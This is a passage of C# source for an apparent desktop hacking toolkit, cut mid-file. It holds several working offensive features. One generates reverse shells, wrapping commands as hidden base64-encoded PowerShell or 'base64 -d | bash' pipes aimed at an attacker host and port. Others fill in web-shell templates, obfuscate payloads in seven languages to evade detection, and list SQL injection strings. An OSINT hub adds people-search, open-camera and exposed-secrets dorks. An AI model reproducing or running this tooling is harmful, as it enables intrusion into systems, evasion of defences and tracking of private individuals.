                    IpLocationOutput.Text = $"Error: {geoNode?["message"]?.GetValue<string>() ?? "lookup failed"}";
                return;
            }

            string resolvedIp  = geoNode["query"]?.GetValue<string>()      ?? target;
            string city        = geoNode["city"]?.GetValue<string>()        ?? "?";
            string region      = geoNode["regionName"]?.GetValue<string>()  ?? "?";
            string country     = geoNode["country"]?.GetValue<string>()     ?? "?";
            string isp         = geoNode["isp"]?.GetValue<string>()         ?? "?";
            string org         = geoNode["org"]?.GetValue<string>()         ?? "?";
            double lat         = geoNode["lat"]?.GetValue<double>()         ?? 0;
            double lon         = geoNode["lon"]?.GetValue<double>()         ?? 0;
            string timezone    = geoNode["timezone"]?.GetValue<string>()    ?? "?";
            string countryCode = geoNode["countryCode"]?.GetValue<string>() ?? "?";

            if (IpLocationOutput != null)
                IpLocationOutput.Text =
                    $"Target:   {target}  →  {resolvedIp}\n" +
                    $"City:     {city}, {region}\n" +
                    $"Country:  {country} ({countryCode})\n" +
                    $"ISP:      {isp}\n" +
                    $"Org:      {org}\n" +
                    $"GPS:      {lat}, {lon}\n" +
                    $"Timezone: {timezone}";

            // ── Map links ─────────────────────────────────────────────────
            if (IpMapLinksPanel != null)
            {
                AddMapLinkButton(IpMapLinksPanel, "Google Maps ↗",
                    $"https://www.google.com/maps?q={lat},{lon}");
                AddMapLinkButton(IpMapLinksPanel, "OpenStreetMap ↗",
                    $"https://www.openstreetmap.org/?mlat={lat}&mlon={lon}&zoom=12");
                AddMapLinkButton(IpMapLinksPanel, "Shodan IP ↗",
                    $"https://www.shodan.io/host/{resolvedIp}");
                AddMapLinkButton(IpMapLinksPanel, "AbuseIPDB ↗",
                    $"https://www.abuseipdb.com/check/{resolvedIp}");
            }

            // ── RDAP/WHOIS ─────────────────────────────────────────────────
            _ = FetchWhoisAsync(resolvedIp);
        }
        catch (Exception ex)
        {
            if (IpLocationOutput != null) IpLocationOutput.Text = $"Connection error: {ex.Message}";
        }
    }

    private void AddMapLinkButton(WrapPanel panel, string label, string url)
    {
        var btn = new Button
        {
            Content      = label,
            Margin       = new Thickness(0, 0, 8, 8),
            Padding      = new Thickness(12, 6),
            Background   = Brushes.Transparent,
            BorderBrush  = new SolidColorBrush(Color.Parse("#30363d")),
            Foreground   = new SolidColorBrush(Color.Parse("#7c6bff")),
            Tag          = url,
        };
        btn.Click += OnLaunchExternalUrl;
        panel.Children.Add(btn);
    }

    private async Task FetchWhoisAsync(string ip)
    {
        try
        {
            string rdapJson = await _http.GetStringAsync($"https://rdap.db.ripe.net/ip/{ip}");
            var d = JsonNode.Parse(rdapJson);
            if (d == null) return;

            var sb = new StringBuilder();
            sb.AppendLine($"NETWORK: {d["name"]?.ToString() ?? "N/A"}");
            sb.AppendLine($"RANGE:   {d["startAddress"]?.ToString()} - {d["endAddress"]?.ToString()}");
            
            var cidrArray = d["cidr0_cidrs"]?.AsArray();
            string cidrStr = cidrArray != null ? string.Join(", ", cidrArray.Select(c => $"{c?["v4prefix"]}/{c?["length"]}")) : "N/A";
            sb.AppendLine($"CIDR:    {cidrStr}");
            sb.AppendLine($"TYPE:    {d["type"]?.ToString() ?? "N/A"}");
            sb.AppendLine();

            void ProcessEntities(JsonArray entities)
            {
                foreach (var ent in entities)
                {
                    var roles = ent?["roles"]?.AsArray();
                    string roleStr = roles != null ? string.Join(", ", roles.Select(r => r?.ToString() ?? "")).ToUpper() : "ENTITY";
                    sb.AppendLine($"[{roleStr}] {ent?["handle"]?.ToString() ?? ""}");

                    if (ent?["vcardArray"] is JsonArray vcard && vcard.Count > 1 && vcard[1] is JsonArray props)
                    {
                        foreach (var prop in props)
                        {
                            if (prop is JsonArray field && field.Count >= 4)
                            {
                                string key = field[0]?.ToString() ?? "";
                                var valNode = field[3];

                                if (key == "fn")    sb.AppendLine($" Name:    {valNode}");
                                if (key == "email") sb.AppendLine($" Email:   {valNode}");
                                if (key == "tel")   sb.AppendLine($" Phone:   {valNode}");
                                
                                if (key == "adr" && valNode is JsonArray addrParts)
                                {
                                    var cleanParts = addrParts.Select(p => p?.ToString() ?? "").Where(s => !string.IsNullOrWhiteSpace(s));
                                    if (cleanParts.Any())
                                        sb.AppendLine($" Address: {string.Join(", ", cleanParts)}");
                                }
                            }
                        }
                    }
                    sb.AppendLine();
                    
                    if (ent?["entities"] is JsonArray subEntities)
                        ProcessEntities(subEntities);
                }
            }

            if (d["entities"] is JsonArray topEntities)
            {
                sb.AppendLine("--- CONTACTS & ENTITIES ---");
                ProcessEntities(topEntities);
            }

            await Avalonia.Threading.Dispatcher.UIThread.InvokeAsync(() => {
                if (IpWhoisOutput != null) IpWhoisOutput.Text = sb.ToString();
            });
        }
        catch (Exception ex)
        {
            await Avalonia.Threading.Dispatcher.UIThread.InvokeAsync(() => {
                if (IpWhoisOutput != null) IpWhoisOutput.Text = $"WHOIS error: {ex.Message}";
            });
        }
    }

    // ══════════════════════════════════════════════════════════════════════
    // OSINT
    // ══════════════════════════════════════════════════════════════════════
    private void OnExecuteOsintHub(object sender, RoutedEventArgs e)
    {
        if (OsintTypeSelector == null || OsintTargetInput == null || OsintResultsContainer == null) return;
        string target = OsintTargetInput.Text ?? "";
        if (string.IsNullOrWhiteSpace(target)) return;

        if (OsintTypeSelector.SelectedItem is not ComboBoxItem si || si.Tag is not string cat) return;
        string enc = Uri.EscapeDataString(target);

        var results = new List<OsintLaunchBlueprints>();

        switch (cat)
        {
            case "username":
                results.Add(new() { Name = "WhatsMyName",                       TargetUrl = $"https://whatsmyname.app/?q={enc}" });
                results.Add(new() { Name = "Instant Username Search",           TargetUrl = $"https://instantusername.com/?q={enc}" });
                results.Add(new() { Name = "Social Profile Footprint (Google)", TargetUrl = $"https://www.google.com/search?q=site:instagram.com+OR+site:twitter.com+OR+site:reddit.com+%22{enc}%22" });
                results.Add(new() { Name = "Linktree Search (Google)",          TargetUrl = $"https://www.google.com/search?q=site:linktr.ee+%22{enc}%22" });
                break;
            case "email":
                results.Add(new() { Name = "EPIOS Account Analyzer",           TargetUrl = $"https://epieos.com/?q={enc}" });
                results.Add(new() { Name = "Hunter.io Email Verifier",         TargetUrl = $"https://hunter.io/email-verifier/{enc}" });
                results.Add(new() { Name = "IntelX Intelligence Search",       TargetUrl = $"https://intelx.io/?s={enc}" });
                results.Add(new() { Name = "HaveIBeenPwned",                   TargetUrl = $"https://haveibeenpwned.com/account/{enc}" });
                results.Add(new() { Name = "Google Leaked Data Dork",          TargetUrl = $"https://www.google.com/search?q=%22{enc}%22+password+OR+leak" });
                break;
            case "domain":
                results.Add(new() { Name = "HackerTarget DNS Intelligence",    TargetUrl = $"https://hackertarget.com/find-dns-host-records/?q={enc}" });
                results.Add(new() { Name = "SecurityTrails",                   TargetUrl = $"https://securitytrails.com/domain/{enc}" });
                results.Add(new() { Name = "CRT.sh Certificate Logs",          TargetUrl = $"https://crt.sh/?q={enc}" });
                results.Add(new() { Name = "ViewDNS DNS Records",              TargetUrl = $"https://viewdns.info/dnsrecord/?domain={enc}" });
                results.Add(new() { Name = "Shodan Hostname Search",           TargetUrl = $"https://www.shodan.io/search?query=hostname:{enc}" });
                results.Add(new() { Name = "BuiltWith Tech Fingerprint",       TargetUrl = $"https://builtwith.com/{enc}" });
                results.Add(new() { Name = "UrlScan.io Active Sandbox",        TargetUrl = $"https://urlscan.io/search/#page.domain:{enc}" });
                break;
            case "person":
                results.Add(new() { Name = "TruePeopleSearch",                 TargetUrl = $"https://www.truepeoplesearch.com/results?name={enc}" });
                results.Add(new() { Name = "ThatsThem Name Lookup",            TargetUrl = $"https://thatsthem.com/name/{enc}" });
                results.Add(new() { Name = "LinkedIn (Google Dork)",           TargetUrl = $"https://www.google.com/search?q=site:linkedin.com/in/+%22{enc}%22" });
                results.Add(new() { Name = "VoterRecords",                     TargetUrl = $"https://voterrecords.com/voters/{enc}" });
                break;
            case "phone":
                results.Add(new() { Name = "ThatsThem Phone Lookup",          TargetUrl = $"https://thatsthem.com/phone/{enc}" });
                results.Add(new() { Name = "Google Reverse Lookup",            TargetUrl = $"https://www.google.com/search?q=%22{enc}%22" });
                results.Add(new() { Name = "USPhoneBook",                      TargetUrl = $"https://www.usphonebook.com/phone-search/" });
                break;
            case "devices":
                results.Add(new() { Name = "Shodan General Search",           TargetUrl = $"https://www.shodan.io/search?query={enc}" });
                results.Add(new() { Name = "Censys Connected System Analyzer", TargetUrl = $"https://search.censys.io/search?resource=hosts&q={enc}" });
                results.Add(new() { Name = "Zoomeye",                         TargetUrl = $"https://www.zoomeye.org/searchResult?q={enc}" });
                results.Add(new() { Name = "Wigle WiFi Maps",                 TargetUrl = $"https://wigle.net/map?ssids={enc}" });
                results.Add(new() { Name = "Dork: Open Cams",                 TargetUrl = $"https://www.google.com/search?q=inurl:%22view.shtml%22+{enc}" });
                results.Add(new() { Name = "Dork: Open Directories",          TargetUrl = $"https://www.google.com/search?q=intitle:%22index+of%22+{enc}" });
                break;
            case "documents":
                string[] exts = { "pdf", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "txt", "log", "bak", "zip", "yml", "env", "config", "sql", "json", "xml" };
                string extQ   = string.Join("+OR+", exts.Select(x => $"ext:{x}"));
                results.Add(new() { Name = $"Document Dork: site:{target}",   TargetUrl = $"https://www.google.com/search?q=site:{enc}+({extQ})" });
                results.Add(new() { Name = "Sensitive Files (env/config/sql)", TargetUrl = $"https://www.google.com/search?q=site:{enc}+(ext:env+OR+ext:config+OR+ext:sql+OR+ext:bak)" });
                results.Add(new() { Name = "Archive Files (zip/tar/rar)",      TargetUrl = $"https://www.google.com/search?q=site:{enc}+(ext:zip+OR+ext:tar+OR+ext:rar+OR+ext:7z)" });
                break;
        }

        OsintResultsContainer.ItemsSource = results;
    }

    private void OnLaunchOsintLink(object sender, RoutedEventArgs e)
    {
        if (sender is Button btn && btn.Tag is string url) OpenUrl(url);
    }

    // ══════════════════════════════════════════════════════════════════════
    // Reverse Shells
    // ══════════════════════════════════════════════════════════════════════
    private void OnShellParamsChanged(object sender, TextChangedEventArgs e)  => UpdateReverseShellContainer();
    private void OnShellSearchChanged(object sender, TextChangedEventArgs e)  => UpdateReverseShellContainer();

    private void OnShellFilterClick(object sender, RoutedEventArgs e)
    {
        if (sender is Button btn && btn.Tag is string f)
        {
            _currentShellFilter = f;
            UpdateReverseShellContainer();
        }
    }

    private void UpdateReverseShellContainer()
    {
        if (ShellsItemsControl == null || ShellLhostInput == null || ShellLportInput == null) return;

        string lhost  = string.IsNullOrWhiteSpace(ShellLhostInput.Text)  ? "10.10.10.10" : ShellLhostInput.Text;
        string lport  = string.IsNullOrWhiteSpace(ShellLportInput.Text)  ? "4444"        : ShellLportInput.Text;
        string search = (ShellSearchBox?.Text ?? "").Trim().ToLowerInvariant();

        var list = _blueprints
            .Where(b => _currentShellFilter == "all" || b.Category == _currentShellFilter)
            .Where(b => string.IsNullOrEmpty(search) ||
                        b.Name.Contains(search, StringComparison.OrdinalIgnoreCase) ||
                        b.Template.Contains(search, StringComparison.OrdinalIgnoreCase))
            .Select(b =>
            {
                string raw = b.Template.Replace("{LHOST}", lhost).Replace("{LPORT}", lport);
                return new ShellPayloadInstance
                {
                    Name           = b.Name,
                    Category       = b.Category,
                    RawCommand     = raw,
                    B64Command     = BuildB64Shell(raw, b.Category, b.Name),
                    UrlCommand     = Uri.EscapeDataString(raw),
                    DisplayCommand = raw,
                };
            }).ToList();

        ShellsItemsControl.ItemsSource = list;
    }

    private static string BuildB64Shell(string raw, string category, string name)
    {
        if (category == "windows" && name.Contains("PowerShell", StringComparison.OrdinalIgnoreCase))
        {
            byte[] utf16 = Encoding.Unicode.GetBytes(raw);
            return $"powershell -nop -w hidden -e {Convert.ToBase64String(utf16)}";
        }
        return $"echo {Convert.ToBase64String(Encoding.UTF8.GetBytes(raw))} | base64 -d | bash";
    }

    private void OnShellTabClick(object sender, RoutedEventArgs e)
    {
        if (sender is not Button tabBtn) return;
        string enc = tabBtn.Tag as string ?? "raw";

        // Walk up to the Border card, find the TextBox in row 2
        var parent = tabBtn.Parent;
        while (parent != null && parent is not Border) parent = ((Avalonia.Visual)parent).Parent as Avalonia.Visual;
        if (parent is not Border card) return;

        var grid = card.Child as Grid;
        if (grid == null) return;

        // Find the TextBox (row 2)
        TextBox? display = null;
        foreach (var ch in grid.Children)
        {
            if (ch is TextBox tb) { display = tb; break; }
        }
        if (display == null) return;

        // Find the ShellPayloadInstance from DataContext
        if (card.DataContext is not ShellPayloadInstance shell) return;

        display.Text = enc switch
        {
            "b64" => shell.B64Command,
            "url" => shell.UrlCommand,
            _     => shell.RawCommand,
        };

        // Highlight active tab button
        var tabRow = grid.Children.OfType<StackPanel>().FirstOrDefault();
        if (tabRow != null)
        {
            foreach (var child in tabRow.Children.OfType<Button>())
            {
                bool active = child == tabBtn;
                child.Background  = active ? new SolidColorBrush(Color.Parse("#0d1117")) : Brushes.Transparent;
                child.Foreground  = active ? new SolidColorBrush(Color.Parse("#7c6bff")) : new SolidColorBrush(Color.Parse("#8b949e"));
            }
        }
    }

    private async void OnCopyShellCommand(object sender, RoutedEventArgs e)
    {
        if (sender is Button btn && btn.Tag is string cmd) await TrySetClipboard(cmd);
    }

    // ══════════════════════════════════════════════════════════════════════
    // Web Shells
    // ══════════════════════════════════════════════════════════════════════
    private void OnWebShellParamsChanged(object sender, TextChangedEventArgs e) => UpdateWebShellContainer();
    private void OnWebShellSearchChanged(object sender, TextChangedEventArgs e) => UpdateWebShellContainer();

    private void OnWebShellFilterClick(object sender, RoutedEventArgs e)
    {
        if (sender is Button btn && btn.Tag is string f)
        {
            _currentWebShellFilter = f;
            UpdateWebShellContainer();
        }
    }

    private void UpdateWebShellContainer()
    {
        if (WebShellsItemsControl == null) return;

        string lhost  = string.IsNullOrWhiteSpace(WebShellLhostInput?.Text) ? "10.10.10.10" : WebShellLhostInput.Text;
        string lport  = string.IsNullOrWhiteSpace(WebShellLportInput?.Text) ? "4444"        : WebShellLportInput.Text; 
        string search = (WebShellSearchBox?.Text ?? "").Trim().ToLowerInvariant();

        var list = _webShellBlueprints
            .Where(b => _currentWebShellFilter == "all" || b.Category == _currentWebShellFilter)
            .Where(b => string.IsNullOrEmpty(search) ||
                        b.Name.Contains(search, StringComparison.OrdinalIgnoreCase) ||
                        b.Template.Contains(search, StringComparison.OrdinalIgnoreCase))
            .Select(b => new ShellPayloadInstance
            {
                Name           = b.Name,
                Category       = b.Category,
                RawCommand     = b.Template.Replace("{LHOST}", lhost).Replace("{LPORT}", lport),  
                DisplayCommand = b.Template.Replace("{LHOST}", lhost).Replace("{LPORT}", lport),  
            }).ToList();

        WebShellsItemsControl.ItemsSource = list;
    }

    private async void OnCopyWebShellCommand(object sender, RoutedEventArgs e)
    {
        if (sender is Button btn && btn.Tag is string cmd) await TrySetClipboard(cmd);
    }

    // ══════════════════════════════════════════════════════════════════════
    // Exploit Search
    // ══════════════════════════════════════════════════════════════════════
    private void OnRunExploitSearch(object sender, RoutedEventArgs e)
    {
        string query = ExploitQueryInput?.Text?.Trim() ?? "";
        if (string.IsNullOrEmpty(query) || ExploitResultsContainer == null) return;

        string enc = Uri.EscapeDataString(query);

        var engines = new List<ExploitEngine>
        {
            new()
            {
                Name        = "Exploit-DB",
                Description = "Direct search against the EDB description and CVE fields.",
                TargetUrl   = $"https://www.exploit-db.com/search?q={enc}"
            },
            new()
            {
                Name        = "Packet Storm Security",
                Description = "Direct query for POCs, advisories, and security tools.",
                TargetUrl   = $"https://packetstormsecurity.com/search/?q={enc}"
            },
            new()
            {
                Name        = "GitHub POC Repositories",
                Description = "Search GitHub for community-hosted exploit and proof-of-concept code.",
                TargetUrl   = $"https://github.com/search?q={enc}+exploit+OR+poc&type=repositories"
            },
            new()
            {
                Name        = "Google Dork → Exploit-DB",
                Description = "Uses Google's index of EDB — often more reliable than native EDB search.",
                TargetUrl   = $"https://www.google.com/search?q=site:exploit-db.com+{enc}"
            },
            new()
            {
                Name        = "NVD / NIST CVE Database",
                Description = "Search the National Vulnerability Database for CVE details and CVSS scores.",
                TargetUrl   = $"https://nvd.nist.gov/vuln/search/results?query={enc}"
            },
            new()
            {
                Name        = "Vulhub POC Library",
                Description = "Docker-based reproducible vulnerability environments for testing.",
                TargetUrl   = $"https://github.com/search?q=org:vulhub+{enc}&type=repositories"
            },
        };

        ExploitResultsContainer.ItemsSource = engines;
    }

    private void OnLaunchExploitLink(object sender, RoutedEventArgs e)
    {
        if (sender is Button btn && btn.Tag is string url) OpenUrl(url);
    }

    // ══════════════════════════════════════════════════════════════════════
    // Obfuscator
    // ══════════════════════════════════════════════════════════════════════
    private void OnObfLangChanged(object sender, SelectionChangedEventArgs e)
    {
        UpdateObfModeButtons();
        RunObfuscatePipeline();
    }

    private void OnObfModeChanged(object sender, SelectionChangedEventArgs e) => RunObfuscatePipeline();
    private void OnObfInputChanged(object sender, TextChangedEventArgs e)     => RunObfuscatePipeline();

    private void UpdateObfModeButtons()
    {
        if (ObfLangSelector?.SelectedItem is not ComboBoxItem li || li.Tag is not string lang) return;
        var supported = ObfSupport.TryGetValue(lang, out var s) ? s : Array.Empty<string>();

        if (ObfModeList == null) return;
        string currentMode = (ObfModeList.SelectedItem as ListBoxItem)?.Tag as string ?? "b64";

        // If current mode is not supported by new lang, reset to first supported
        if (!supported.Contains(currentMode))
        {
            var first = ObfModeList.Items
                .OfType<ListBoxItem>()
                .FirstOrDefault(it => supported.Contains(it.Tag as string ?? ""));
            if (first != null) ObfModeList.SelectedItem = first;
        }
    }

    private void RunObfuscatePipeline()
    {
        if (ObfLangSelector == null || ObfModeList == null || ObfInputBox == null || ObfOutputBox == null) return;

        string lang = (ObfLangSelector.SelectedItem as ComboBoxItem)?.Tag as string ?? "bash";
        string mode = (ObfModeList.SelectedItem as ListBoxItem)?.Tag as string ?? "b64";
        string code = ObfInputBox.Text ?? "";

        // Update tip
        if (ObfTipText != null)
        {
            string tip = ObfTips.TryGetValue(mode, out var langMap) && langMap.TryGetValue(lang, out var t) ? t : "";
            ObfTipText.Text = tip;
        }

        if (string.IsNullOrWhiteSpace(code))
        {
            ObfOutputBox.Text = "result appears here";
            return;
        }

        try   { ObfOutputBox.Text = ObfuscateCode(code, lang, mode); }
        catch (Exception ex) { ObfOutputBox.Text = $"[error: {ex.Message}]"; }
    }

    private static string ObfuscateCode(string code, string lang, string mode)
    {
        string b64    = Convert.ToBase64String(Encoding.UTF8.GetBytes(code));
        string rawHex = string.Concat(Encoding.UTF8.GetBytes(code).Select(b => b.ToString("x2")));

        if (mode == "b64")
        {
            return lang switch
            {
                "bash"       => $"eval \"$(echo '{b64}' | base64 -d)\"",
                "powershell" => $"powershell -nop -w hidden -EncodedCommand {Convert.ToBase64String(Encoding.Unicode.GetBytes(code))}",
                "python"     => $"python3 -c \"exec(__import__('base64').b64decode('{b64}').decode())\"",
                "php"        => $"php -r \"eval(base64_decode('{b64}'));\"",
                "javascript" => $"eval(atob('{b64}'))",
                "perl"       => $"perl -MMIME::Base64 -e 'eval(decode_base64(\"{b64}\"));'",
                "ruby"       => $"ruby -e \"require 'base64'; eval(Base64.decode64('{b64}'))\"",
                _            => $"eval \"$(echo '{b64}' | base64 -d)\"",
            };
        }

        if (mode == "hex")
        {
            string xhex = string.Concat(code.Select(c => $"\\x{(int)c:x2}"));
            return lang switch
            {
                "bash"       => $"eval $'{xhex}'",
                "powershell" => $"powershell -nop -w hidden -c \"$s=[System.Text.Encoding]::UTF8.GetString([byte[]]({string.Join(",", code.Select(c => $"0x{(int)c:x2}"))})); iex $s\"",
                "python"     => $"python3 -c \"exec(bytes.fromhex('{rawHex}').decode())\"",
                "php"        => $"php -r \"eval(pack('H*','{rawHex}'));\"",
                "javascript" => $"eval(\"{xhex}\")",
                "perl"       => $"perl -e \"eval pack('H*','{rawHex}');\"",
                "ruby"       => $"ruby -e \"eval ['{rawHex}'].pack('H*')\"",
                _            => $"eval $'{xhex}'",
            };
        }

        if (mode == "char")
        {
            var codes = string.Join(",", code.Select(c => (int)c));
            return lang switch
            {
                "bash"       => $"bash -c $'{string.Concat(code.Select(c => $"\\{(int)c:000}"))}'",
                "powershell" => $"iex(-join({string.Join(",", code.Select(c => $"[char]{(int)c}"))})" + ")",
                "python"     => $"python3 -c \"exec(''.join(chr(c) for c in [{codes}]))\"",
                "php"        => $"php -r \"eval(implode('',array_map('chr',array({codes}))));\"",
                "javascript" => $"eval([{codes}].map(c=>String.fromCharCode(c)).join(''))",
                "perl"       => $"perl -e \"eval join('',map{{chr}}({codes}));\"",
                "ruby"       => $"ruby -e \"eval [{codes}].map{{|c|c.chr}}.join\"",
                _            => $"bash -c $'{string.Concat(code.Select(c => $"\\{(int)c:000}"))}'",
            };
        }

        if (mode == "rev")
        {
            string rev = new string(code.Reverse().ToArray());
            string revHex = string.Concat(rev.Select(c => $"{(int)c:x2}"));
            return lang switch
            {
                "bash"       => $"echo '{rev.Replace("'", "'\\''") }' | rev | bash",
                "powershell" => $"iex(-join('{rev.Replace("'", "''")}'[-1..-{rev.Length}]))",
                "python"     => $"python3 -c \"exec(bytes.fromhex('{revHex}').decode()[::-1])\"",
                "php"        => $"php -r \"eval(strrev(pack('H*','{revHex}')));\"",
                "javascript" => $"eval({JsonSerializer.Serialize(rev)}.split('').reverse().join(''))",
                "perl"       => $"perl -e \"eval scalar reverse pack('H*','{revHex}');\"", // Added missing brace here
                "ruby"       => $"ruby -e \"eval pack('H*','{revHex}').reverse\"",
                _            => $"echo '{rev.Replace("'", "'\\''") }' | rev | bash",
            };
        } 

        if (mode == "var")
        {
            int chunkSize = Math.Max(4, code.Length / 5);
            var chunks    = Enumerable.Range(0, (code.Length + chunkSize - 1) / chunkSize)
                                      .Select(i => code.Substring(i * chunkSize, Math.Min(chunkSize, code.Length - i * chunkSize)))
                                      .ToList();
            var vars = chunks.Select((_, i) => $"v{Guid.NewGuid().ToString("N")[..4]}{i}").ToList();

            return lang switch
            {
                "bash" => string.Join("\n", vars.Select((v, i) => $"{v}='{chunks[i].Replace("'", "'\\''")}'")) +
                          $"\neval \"{string.Join("", vars.Select(v => "${" + v + "}"))}\"",
                "powershell" => string.Join("\n", vars.Select((v, i) => $"${v}='{chunks[i].Replace("'", "''")}'")) +
                                $"\niex(${string.Join("+$", vars)})",
                "python" => string.Join("\n", vars.Select((v, i) => $"{v}={JsonSerializer.Serialize(chunks[i])}")) +
                            $"\nexec({string.Join("+", vars)})",
                "php" => "<?php\n" + string.Join(";\n", vars.Select((v, i) => $"${v}={JsonSerializer.Serialize(chunks[i])}")) +
                         $";\neval(${string.Join(".$", vars)});\n?>",
                "javascript" => string.Join(";\n", vars.Select((v, i) => $"var {v}={JsonSerializer.Serialize(chunks[i])}")) +
                                $";\neval({string.Join("+", vars)})",
                "cmd" => "@echo off\nsetlocal enabledelayedexpansion\n" +
                         string.Join("\n", vars.Select((v, i) => $"SET {v}={chunks[i]}")) +
                         $"\nSET _r={string.Join("", vars.Select(v => $"!{v}!"))}\ncall cmd /c !_r!",
                "perl" => string.Join(";\n", vars.Select((v, i) => $"my ${v}={JsonSerializer.Serialize(chunks[i])}")) +
                          $";\neval(${string.Join(".$", vars)});",
                "ruby" => string.Join("\n", vars.Select((v, i) => $"{v}={JsonSerializer.Serialize(chunks[i])}")) +
                          $"\neval {string.Join("+", vars)}",
                _ => string.Join("\n", vars.Select((v, i) => $"{v}='{chunks[i].Replace("'", "'\\''")}'")) +
                     $"\neval \"{string.Join("", vars.Select(v => "${" + v + "}"))}\"",
            };
        }

        if (mode == "tick")
        {
            var rng = new Random();
            return lang switch
            {
                "bash"       => InsertBetweenAlpha(code, "''", rng),
                "cmd"        => InsertBetweenAlpha(code, "^",  rng),
                "powershell" => InsertBetweenAlpha(code, "`",  rng),
                "python"     => SplitStringLiterals(code, " + ", rng),
                "php"        => SplitStringLiterals(code, ".",   rng),
                "perl"       => SplitStringLiterals(code, ".",   rng),
                "ruby"       => SplitStringLiterals(code, " + ", rng),
                "javascript" => UnicodeEscapeIdents(code, rng),
                _            => InsertBetweenAlpha(code, "''", rng),
            };
        }

        return code;
    }

    private static string InsertBetweenAlpha(string code, string insert, Random rng)
    {
        var sb = new StringBuilder();
        for (int i = 0; i < code.Length; i++)
        {
            sb.Append(code[i]);
            if (i + 1 < code.Length && char.IsLetter(code[i]) && char.IsLetter(code[i + 1]) && rng.NextDouble() > 0.5)
                sb.Append(insert);
        }
        return sb.ToString();
    }

    private static string SplitStringLiterals(string code, string joinOp, Random rng)
    {
        var sb = new StringBuilder();
        int i  = 0;
        while (i < code.Length)
        {
            char q = code[i];
            if (q == '"' || q == '\'')
            {
                var lit = new StringBuilder();
                lit.Append(q); i++;
                while (i < code.Length)
                {
                    if (code[i] == '\\' && i + 1 < code.Length) { lit.Append(code[i]); lit.Append(code[i + 1]); i += 2; continue; }
                    if (code[i] == q) { lit.Append(q); i++; break; }
                    lit.Append(code[i++]);
                }
                string inner = lit.ToString();
                if (inner.Length > 6)
                {
                    int mid = inner.Length / 2;
                    sb.Append(inner[..mid] + q + joinOp + q + inner[mid..]);
                }
                else { sb.Append(inner); }
                continue;
            }
            sb.Append(code[i++]);
        }
        return sb.ToString();
    }

    private static string UnicodeEscapeIdents(string code, Random rng)
    {
        var sb = new StringBuilder();
        int i  = 0;
        while (i < code.Length)
        {
            char q = code[i];
            if (q == '"' || q == '\'' || q == '`')
            {
                sb.Append(q); i++;
                while (i < code.Length)
                {
                    if (code[i] == '\\' && i + 1 < code.Length) { sb.Append(code[i]); sb.Append(code[i + 1]); i += 2; continue; }
                    if (code[i] == q) { sb.Append(code[i++]); break; }
                    sb.Append(code[i++]);
                }
                continue;
            }
            if (char.IsLetter(code[i]) || code[i] == '_' || code[i] == '$')
            {
                var ident = new StringBuilder();
                while (i < code.Length && (char.IsLetterOrDigit(code[i]) || code[i] == '_' || code[i] == '$'))
                    ident.Append(code[i++]);
                foreach (char c in ident.ToString())
                    sb.Append(char.IsLetter(c) && rng.NextDouble() > 0.5 ? $"\\u{(int)c:x4}" : c.ToString());
                continue;
            }
            sb.Append(code[i++]);
        }
        return sb.ToString();
    }

    private async void OnCopyObfOutput(object sender, RoutedEventArgs e)
    {
        if (ObfOutputBox?.Text is string txt && txt != "result appears here")
            await TrySetClipboard(txt);
    }

    // ══════════════════════════════════════════════════════════════════════
    // Import / Export
    // ══════════════════════════════════════════════════════════════════════
    private async void OnImportClick(object sender, RoutedEventArgs e)
    {
        var topLevel = GetTopLevel(this);
        if (topLevel == null) return;
        
        var files = await topLevel.StorageProvider.OpenFilePickerAsync(
            new Avalonia.Platform.Storage.FilePickerOpenOptions { Title = "Import Vault", AllowMultiple = false });
        
        if (files is { Count: > 0 })
        {
            try
            {
                using var stream = await files[0].OpenReadAsync();
                using var reader = new StreamReader(stream);
                string jsonContent = await reader.ReadToEndAsync();

                // Deserialize into the wrapper class to handle the "cats" structure
                var options = new JsonSerializerOptions { PropertyNameCaseInsensitive = true };
                var backup = JsonSerializer.Deserialize<VaultBackup>(jsonContent, options);

                if (backup != null)
                {
                    _categories = backup.Cats;
                    SaveDataToDisk();
                    PopulateSidebarTree();
                    DisplayEmptyState();
                }
            }
            catch (Exception ex)
            {
                // Optional: log or show an error dialog if the file is invalid
                Debug.WriteLine($"Import failed: {ex.Message}");
            }
        }
    }

    private async void OnExportClick(object sender, RoutedEventArgs e)
    {
        var topLevel = GetTopLevel(this);
        if (topLevel == null) return;
        var file = await topLevel.StorageProvider.SaveFilePickerAsync(
            new Avalonia.Platform.Storage.FilePickerSaveOptions { Title = "Export Vault", SuggestedFileName = "vault.json" });
        if (file != null)
        {
            try
            {
                using var stream = await file.OpenWriteAsync();
                using var writer = new StreamWriter(stream);
                await writer.WriteAsync(JsonSerializer.Serialize(_categories, new JsonSerializerOptions { WriteIndented = true }));
            }
            catch { }
        }
    }

    // ══════════════════════════════════════════════════════════════════════
    // Persistence
    // ══════════════════════════════════════════════════════════════════════
    private void SaveDataToDisk()
    {
        try 
        { 
            // Wrap the list in our VaultBackup class before serializing
            var backup = new VaultBackup { Cats = _categories };
            var options = new JsonSerializerOptions { WriteIndented = true };
            
            File.WriteAllText(_storagePath, JsonSerializer.Serialize(backup, options)); 
        }
        catch { }
    }

    private void LoadDataFromDisk()
    {
        if (File.Exists(_storagePath))
        {
            try
            {
                var jsonContent = File.ReadAllText(_storagePath);
                var options = new JsonSerializerOptions { PropertyNameCaseInsensitive = true };
                
                // Deserialize into the wrapper class instead of a raw List
                var backup = JsonSerializer.Deserialize<VaultBackup>(jsonContent, options);
                
                if (backup != null) 
                { 
                    _categories = backup.Cats; 
                    PopulateSidebarTree(); 
                    return; 
                }
            }
            catch { }
        }
        // Fallback if file doesn't exist or deserialization fails
        _categories = new List<CategoryItem>();
    }

    // ══════════════════════════════════════════════════════════════════════
    // Utilities
    // ══════════════════════════════════════════════════════════════════════
    private async Task TrySetClipboard(string text)
    {
        var topLevel = GetTopLevel(this);
        if (topLevel?.Clipboard != null) await topLevel.Clipboard.SetTextAsync(text);
    }

    // ══════════════════════════════════════════════════════════════════════
    // SQLi Payload Lab
    // ══════════════════════════════════════════════════════════════════════

    private static readonly List<SqliBlueprint> _sqliBlueprints = new()
    {
        // ── Classic ──────────────────────────────────────────────────────
        new() { Name = "Always-true single quote",        Cat = "classic", Payload = "' OR '1'='1" },
        new() { Name = "Always-true double quote",        Cat = "classic", Payload = "\" OR \"1\"=\"1" },
        new() { Name = "Always-true no quote",            Cat = "classic", Payload = "1 OR 1=1" },
        new() { Name = "Comment terminator --",           Cat = "classic", Payload = "' OR '1'='1'--" },
        new() { Name = "Comment terminator #",            Cat = "classic", Payload = "' OR '1'='1'#" },
